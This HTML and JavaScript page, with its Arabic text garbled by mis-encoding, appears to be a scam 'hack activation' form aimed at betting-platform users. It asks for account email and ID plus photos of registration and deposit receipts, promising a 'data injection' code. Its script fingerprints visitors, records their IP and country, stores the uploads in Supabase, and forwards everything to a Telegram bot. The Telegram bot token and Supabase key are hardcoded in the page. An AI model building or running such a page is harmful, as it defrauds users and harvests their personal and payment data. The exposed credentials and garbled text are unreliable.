<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø·Ù„Ø¨ ØªÙØ¹ÙŠÙ„ Ø¬Ø¯ÙŠØ¯</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div id="customModal" class="modal-overlay">
        <div class="modal-box">
            <div class="modal-title" id="modalTitle"></div>
            <div class="modal-msg" id="modalMsg"></div>
            <div class="modal-actions"><button class="modal-btn" onclick="closeModal()">Ù…ÙˆØ§ÙÙ‚</button></div>
        </div>
    </div>

    <div id="loadingOverlay" class="loading-overlay">
        <div class="spinner"></div>
        <div id="loadingText" class="loading-text" style="color:#0f0;">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚...</div>
    </div>

    <div class="container wide-mode" id="mainContainer" style="display:none;">
        <h2 id="typewriterTitle"></h2>
        
        <label class="title">>> Ø§Ø®ØªØ± Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ø³ØªÙ‡Ø¯Ù:</label>
        <div class="program-grid">
            <div class="program-option" data-tooltip="Ù†Ø³Ø¨Ø© Ù†Ø¬Ø§Ø­ 98%" onclick="selectProgram('1x', this)"><img src="1x.png" class="program-icon"></div>
            <div class="program-option" data-tooltip="Ø³ÙŠØ±ÙØ±Ø§Øª Ø±ÙˆØ³ÙŠØ©" onclick="selectProgram('m', this)"><img src="m.png" class="program-icon"></div>
            <div class="program-option" data-tooltip="ØªØ´ÙÙŠØ± Ø¹Ø§Ù„ÙŠ" onclick="selectProgram('l', this)"><img src="l.png" class="program-icon"></div>
        </div>

        <label class="title">>> Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¹Ù…ÙŠÙ„:</label>
        <div class="input-wrapper">
            <button class="paste-btn" onclick="pasteText('userData')" title="Ù„ØµÙ‚">ğŸ“‹</button>
            <textarea id="userData" placeholder="Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ ÙˆØ§Ù„Ø¢ÙŠØ¯ÙŠ..." style="padding-left: 40px;"></textarea>
        </div>

        <div style="display: flex; gap: 20px; flex-wrap: wrap;">
            <div style="flex: 1; min-width: 250px;">
                <label class="title">>> Ø¥Ø«Ø¨Ø§Øª Ø§Ù„ØªØ³Ø¬ÙŠÙ„:</label>
                <label for="regProof" class="upload-box" id="regBox" data-tooltip="ØµÙˆØ±Ø© ÙˆØ§Ø¶Ø­Ø© Ù„Ù„Ø­Ø³Ø§Ø¨">
                    <div class="upload-placeholder"><span id="regText">Ø±ÙØ¹</span> ğŸ“‚</div>
                    <img id="regPreview" class="preview-img">
                    <input type="file" id="regProof" accept="image/*" onchange="handleFileSelect(this, 'regBox', 'regText', 'regPreview')">
                </label>
            </div>
            <div style="flex: 1; min-width: 250px;">
                <label class="title">>> Ø¥Ø«Ø¨Ø§Øª Ø§Ù„Ø¥ÙŠØ¯Ø§Ø¹:</label>
                <label for="depProof" class="upload-box" id="depBox" data-tooltip="Ø¥ÙŠØµØ§Ù„ Ø§Ù„Ø¯ÙØ¹ Ø§Ù„Ø£Ø®ÙŠØ±">
                    <div class="upload-placeholder"><span id="depText">Ø±ÙØ¹</span> ğŸ’°</div>
                    <img id="depPreview" class="preview-img">
                    <input type="file" id="depProof" accept="image/*" onchange="handleFileSelect(this, 'depBox', 'depText', 'depPreview')">
                </label>
            </div>
        </div>

        <button id="submitBtn" onclick="runSubmit()">Ø­Ù‚Ù† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙˆØªÙˆÙ„ÙŠØ¯ Ø§Ù„ÙƒÙˆØ¯</button>
        
        <div id="codeDisplay" class="hidden" style="margin-top: 30px; border-top: 1px solid rgba(0,255,0,0.2); padding-top: 20px;">
            <p style="color:var(--hacker-green);">>> ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ù…Ø±Ø§Ø¬Ø¹Ø©. Ø§Ù„ÙƒÙˆØ¯:</p>
            <div style="background:rgba(0,0,0,0.5); padding:20px; border-radius:10px; border:1px solid var(--hacker-green); margin:15px 0; font-size:2.2rem; font-weight:900; letter-spacing:4px; font-family:'Fira Code'; color:#fff;" id="generatedCode"></div>
            <p style="color:#ffaa00; font-size:0.9rem;">âš ï¸ Ø§Ø­ØªÙØ¸ Ø¨Ø§Ù„ÙƒÙˆØ¯! Ø¨Ø§Ù†ØªØ¸Ø§Ø± Ù…ÙˆØ§ÙÙ‚Ø© Ø§Ù„Ø£Ø¯Ù…Ù†.</p>
            <button class="copy-btn" onclick="copyCode()">ğŸ“‹ Ù†Ø³Ø®</button>
            <br>
            <button class="secondary-btn" onclick="window.location.href='index.html'" style="margin-top:20px; width:100%; border-color:#fff; color:#fff;">ğŸ”™ Ø§Ù„Ø¹ÙˆØ¯Ø©</button>
        </div>
    </div>

    <a href="https://t.me/YOUR_CHANNEL_HERE" target="_blank" class="telegram-float" data-tooltip="ØªÙˆØ§ØµÙ„ Ù…Ø¹Ù†Ø§">
        <svg class="telegram-icon" viewBox="0 0 24 24"><path d="M20.665 3.717l-17.73 6.837c-1.21.486-1.203 1.161-.222 1.462l4.552 1.42 10.532-6.645c.498-.303.953-.14.579.192l-8.533 7.701h-.002l.002.001-.314 4.692c.46 0 .663-.211.921-.46l2.211-2.15 4.599 3.397c.848.467 1.457.227 1.668-.785l3.019-14.228c.309-1.239-.473-1.8-1.282-1.434z"/></svg>
    </a>

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script>
        // --- Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ§Øª ---
        function showModal(t, m) { document.getElementById('modalTitle').innerText = t; document.getElementById('modalMsg').innerText = m; document.getElementById('customModal').classList.add('active'); playSound('click'); }
        function closeModal() { document.getElementById('customModal').classList.remove('active'); }
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        function playSound(type) { if (audioCtx.state === 'suspended') audioCtx.resume(); const osc = audioCtx.createOscillator(); const gain = audioCtx.createGain(); osc.connect(gain); gain.connect(audioCtx.destination); if (type === 'click') { osc.type = 'sine'; osc.frequency.setValueAtTime(800, audioCtx.currentTime); gain.gain.setValueAtTime(0.1, audioCtx.currentTime); osc.start(); osc.stop(audioCtx.currentTime + 0.05); } else if (type === 'success') { osc.type = 'square'; osc.frequency.setValueAtTime(400, audioCtx.currentTime); osc.frequency.exponentialRampToValueAtTime(1000, audioCtx.currentTime + 0.1); gain.gain.setValueAtTime(0.1, audioCtx.currentTime); osc.start(); osc.stop(audioCtx.currentTime + 0.3); } }

        const SUPABASE_URL = 'https://zflgifemhopabfzgczgs.supabase.co';
        const SUPABASE_KEY = 'sb_publishable_9xZcd3BkgL6cEQwHJitrew_mbX74lJW';
        const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
        const TELEGRAM_TOKEN = '8362386006:AAF8yKWrs7LCKva6zcu379Vn-vma1xbjF1s';
        const ADMIN_CHAT_ID = '8114406682';

        let userIP = "Unknown";
        let userCountry = "Unknown";
        let deviceFP = "FP-" + Date.now().toString(36) + Math.random().toString(36).substr(2); // [74] Simple Fingerprint

        // [33] ÙØ­Øµ VPN + Ø§Ù„Ø­Ø¸Ø±
        async function checkSecurity() {
            document.getElementById('loadingOverlay').classList.add('active');
            try {
                // Ø§Ø³ØªØ®Ø¯Ø§Ù… API Ù…Ø¬Ø§Ù†ÙŠ Ù„ÙØ­Øµ Ø§Ù„Ø¯ÙˆÙ„Ø© ÙˆØ§Ù„Ø¨Ø±ÙˆÙƒØ³ÙŠ
                const res = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,query,mobile,proxy,hosting');
                const data = await res.json();
                
                if(data.status === 'success') {
                    userIP = data.query;
                    userCountry = data.countryCode;

                    // [33] VPN Warning
                    if (data.proxy || data.hosting) {
                        showModal("âš ï¸ ØªØ­Ø°ÙŠØ± Ø£Ù…Ù†ÙŠ", "ØªÙ… Ø§ÙƒØªØ´Ø§Ù Ø§ØªØµØ§Ù„ VPN Ø£Ùˆ Proxy. ÙŠÙØ¶Ù„ Ø¥ØºÙ„Ø§Ù‚Ù‡ Ù„Ø¶Ù…Ø§Ù† Ø¹Ù…Ù„ Ø§Ù„ÙƒÙˆØ¯.");
                    }
                    
                    // ÙØ­Øµ Ø§Ù„Ø­Ø¸Ø± ÙÙŠ Supabase
                    const { data: banned } = await _supabase.from('banned_ips').select('*').eq('ip', userIP);
                    if (banned && banned.length > 0) {
                        document.body.innerHTML = `<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:red;flex-direction:column;text-align:center;"><h1 style="font-size:4rem;text-shadow:0 0 20px red;">ğŸš« ACCESS DENIED</h1><p>BANNED IP</p></div>`;
                    } else {
                        document.getElementById('loadingOverlay').classList.remove('active');
                        document.getElementById('mainContainer').style.display = 'block';
                        typeWriter("Ø¥Ø¹Ø¯Ø§Ø¯ ØªØµØ±ÙŠØ­ Ø¬Ø¯ÙŠØ¯ //", "typewriterTitle");
                    }
                }
            } catch (e) {
                // ÙÙŠ Ø­Ø§Ù„Ø© ÙØ´Ù„ Ø§Ù„Ù€ API Ù†ÙƒÙ…Ù„ Ø¹Ø§Ø¯ÙŠ
                document.getElementById('loadingOverlay').classList.remove('active');
                document.getElementById('mainContainer').style.display = 'block';
            }
        }
        window.onload = checkSecurity;

        // [18] Paste Function
        async function pasteText(id) {
            try {
                const text = await navigator.clipboard.readText();
                document.getElementById(id).value = text;
                playSound('click');
            } catch (err) { showModal("Ø®Ø·Ø£", "ÙŠØ¬Ø¨ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„Ù„ØµÙ‚."); }
        }

        function typeWriter(text, elementId) { let i = 0; const target = document.getElementById(elementId); target.innerHTML = ""; function type() { if (i < text.length) { target.innerHTML += text.charAt(i); i++; setTimeout(type, 50); } } type(); }
        let selectedProgram = null;
        function selectProgram(name, el) { selectedProgram = name; document.querySelectorAll('.program-option').forEach(d => d.classList.remove('selected')); el.classList.add('selected'); playSound('click'); }
        function handleFileSelect(input, boxId, textId, previewId) { if(input.files[0]) { playSound('click'); const file = input.files[0]; document.getElementById(boxId).classList.add('uploaded'); document.getElementById(textId).innerText = "ØªÙ…"; const reader = new FileReader(); reader.onload = e => { const img = document.getElementById(previewId); img.src = e.target.result; img.style.display = "block"; }; reader.readAsDataURL(file); } }
        function copyCode() { const code = document.getElementById('generatedCode').innerText; navigator.clipboard.writeText(code); showModal("âœ… Ù†Ø¬Ø§Ø­", "ØªÙ… Ø§Ù„Ù†Ø³Ø®!"); }
        
        async function uploadImage(file) { const fileName = `${Date.now()}_${file.name.replace(/\s/g, '_')}`; const { error } = await _supabase.storage.from('proofs').upload(fileName, file); if(error) throw error; const { data } = _supabase.storage.from('proofs').getPublicUrl(fileName); return data.publicUrl; }
        async function sendToTelegram(program, data, code, regUrl, depUrl, ip) { const apiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`; const message = `ğŸš¨ <b>Ø·Ù„Ø¨ Ø¬Ø¯ÙŠØ¯!</b>\nğŸŒ <b>IP:</b> ${ip} (${userCountry})\nğŸ“± <b>FP:</b> ${deviceFP}\nğŸ’» <b>${program}</b>\nğŸ‘¤ <b>Ø¨ÙŠØ§Ù†Ø§Øª:</b>\n${data}\n\nğŸ”‘ <code>${code}</code>\nâš ï¸ <i>Ù…Ø¹Ù„Ù‚</i>`; fetch(`${apiUrl}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: message, parse_mode: 'HTML' }) }); fetch(`${apiUrl}/sendPhoto`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, photo: regUrl }) }); fetch(`${apiUrl}/sendPhoto`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, photo: depUrl }) }); }

        async function runSubmit() {
            playSound('click');
            const userData = document.getElementById('userData').value;
            const regFile = document.getElementById('regProof').files[0];
            const depFile = document.getElementById('depProof').files[0];
            const btn = document.getElementById('submitBtn');

            if(!selectedProgram) { showModal("âš ï¸ Ø®Ø·Ø£", "Ø§Ø®ØªØ± Ø§Ù„Ø¨Ø±Ù†Ø§Ù…Ø¬."); document.querySelector('.program-grid').classList.add('shake'); setTimeout(()=>document.querySelector('.program-grid').classList.remove('shake'), 500); return; }
            if(!userData) { showModal("âš ï¸ Ø®Ø·Ø£", "Ø£Ø¯Ø®Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª."); document.getElementById('userData').classList.add('shake'); setTimeout(()=>document.getElementById('userData').classList.remove('shake'), 500); return; }
            if(!regFile || !depFile) { showModal("âš ï¸ Ø®Ø·Ø£", "Ø§Ø±ÙØ¹ Ø§Ù„ØµÙˆØ±."); return; }

            document.getElementById('loadingOverlay').classList.add('active');
            document.getElementById('loadingText').innerText = "Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ´ÙÙŠØ± ÙˆØ§Ù„Ø±ÙØ¹...";

            try {
                const regUrl = await uploadImage(regFile);
                const depUrl = await uploadImage(depFile);
                const code = 'CODE-' + Math.floor(100000 + Math.random() * 900000);
                // [47] Device Info (User Agent)
                const deviceInfo = navigator.userAgent; 
                
                const fullData = `Ø§Ù„Ù†Ø¸Ø§Ù…: [${selectedProgram}] | IP: ${userIP}\n${userData}`;

                await _supabase.from('requests').insert([{ 
                    user_data: fullData, reg_proof_url: regUrl, dep_proof_url: depUrl, generated_code: code,
                    fingerprint: deviceFP, device_info: deviceInfo, country_code: userCountry
                }]);
                await _supabase.from('active_codes').insert([{ code: code, is_active: false }]);

                sendToTelegram(selectedProgram, userData, code, regUrl, depUrl, userIP);

                document.getElementById('loadingOverlay').classList.remove('active');
                playSound('success'); showModal("âœ… ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„", "ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ù…Ø±Ø§Ø¬Ø¹Ø©. Ø§Ù†ØªØ¸Ø± Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø©.");
                
                document.getElementById('codeDisplay').classList.remove('hidden');
                document.getElementById('generatedCode').innerText = code;
                btn.style.display = 'none';
                document.getElementById('codeDisplay').scrollIntoView({ behavior: 'smooth' });

            } catch (e) { document.getElementById('loadingOverlay').classList.remove('active'); showModal("âŒ ÙØ´Ù„", "ÙØ´Ù„ Ø§Ù„Ø§ØªØµØ§Ù„."); }
        }
    </script>
</body>
</html>
